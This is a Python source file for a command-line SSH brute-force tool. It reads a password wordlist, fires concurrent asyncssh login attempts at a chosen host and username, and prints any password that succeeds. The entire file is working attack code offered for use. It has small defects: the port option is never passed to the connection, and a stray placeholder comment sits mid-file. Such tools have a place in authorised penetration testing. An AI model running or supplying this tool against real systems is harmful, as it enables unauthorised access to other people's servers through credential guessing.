import asyncio,argparse,asyncssh,colorama,random
from termcolor import colored
from os import path
from datetime import datetime
from colorama import Fore, Style

colorama.init(autoreset=True)
green = Fore.GREEN
magenta = Fore.MAGENTA
cyan = Fore.CYAN
mixed = Fore.RED + Fore.BLUE
red = Fore.RED
blue = Fore.BLUE
yellow = Fore.YELLOW
white = Fore.WHITE
colors = [magenta,cyan,mixed,red,blue,yellow, white]
random_color = random.choice(colors)
bold = Style.BRIGHT

def banner():

    print(f'''{bold}{random_color}


░██████╗░██████╗██╗░░██╗██████╗░██████╗░██╗░░░██╗████████╗███████╗
██╔════╝██╔════╝██║░░██║██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
╚█████╗░╚█████╗░███████║██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
░╚═══██╗░╚═══██╗██╔══██║██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
██████╔╝██████╔╝██║░░██║██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
╚═════╝░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
          
        Author   : Aashish💕💕  
                                              
        Github   : https://github.com/aashishsec
          
        SSH BruteForce is a tool designed to guess the correct password for the given username.
''')

def get_args():
    parser = argparse.ArgumentParser(description=f"{bold}{random_color}SSH BruteForce is a tool designed to guess the correct password for the given username.")
    parser.add_argument('-t','--target',dest='target', help=f'{bold}{random_color}Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=22, type=int, required=False, help=f"{bold}{random_color}Port to attack on, Default:22")
    parser.add_argument('-w', '--wordlist', dest='wordlist',required=True, type=str, help=f"{bold}{random_color}Wordlist to bruteforce")
    parser.add_argument('-u', '--username', dest='username', required=True, help=f"{bold}{random_color}Username with which bruteforce to ")
    arguments = parser.parse_args()
    return arguments

async def main(hostname, port, username, wordlist):
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0

    with open(wordlist, encoding="utf8") as f:
        for password in f.readlines():
            password = password.rstrip()
            passwords.append(password)

    for password in passwords:
        if counter >= concurrency_limit:
            if tasks:
                await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = []
                counter = 0
        if  found_flag.is_set():
            print(password)
        
        tasks.append(asyncio.create_task(ssh_bruteforce(hostname, username, password, port, found_flag)))

        await asyncio.sleep(1)
        counter += 1
    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(f"{bold}{random_color}\n [-] Failed to find the correct passpwrd.")

# ... (rest of the code remains the same)


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    try:
        async with asyncssh.connect(host=hostname, username=username, password=password) as conn:
            found_flag.set()
            print(f"{bold}{random_color}[{port}] [ssh] host:{hostname}  login:{username}  password:{password}")

    except Exception as err:
        print(f"{bold}{random_color}[Attempt] target {hostname} - login:{username} - password:{password}")

if __name__ == "__main__":
    banner()
    arguments = get_args()
    if not path.exists(arguments.wordlist):
        print(f"{bold}{random_color}[-] Wordlist location is not right,\n[-] Provide the right path of the wordlist")
        exit(1)
    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red",), end="")
    print(arguments.target)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)
    print(colored(f"[*] Port\t: ", "light_red"), end="")
    print('22' if not arguments.port else arguments.port)
    print(colored(f"[*] Wordlist\t: ", "light_red"), end="")
    print(arguments.wordlist)
    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("SSH")
    print("---------------------------------------------------------\n---------------------------------------------------------", )
    print(colored( f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.target, arguments.port, arguments.username, arguments.wordlist))
